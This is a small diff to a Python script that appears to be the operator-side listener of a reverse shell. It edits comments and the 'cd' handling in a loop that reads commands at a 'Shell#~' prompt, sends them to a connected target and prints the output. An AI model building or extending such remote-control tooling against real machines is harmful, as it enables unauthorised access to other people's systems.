@@ -3,7 +3,6 @@
 #       BIND
 #           LISTEN
 #                 ACCEPT
-# %s  is the IP to be attached to this string
 
 import socket
 import json
@@ -23,11 +22,11 @@ def reliable_recv():
 
 def shell():
 	while True:
-		command = input("* Shell#~%s: " % str(ip))
+		command = input("* Shell#~%s: " % str(ip)) # %s outputs the IP of target 
 		reliable_send(command)
 		if command == "q":
                 	break
-		elif command[:2] == "cd" and len(command) > 1:
+		elif command[:2] == "cd":
 					continue
 		else:
 				result = reliable_recv()
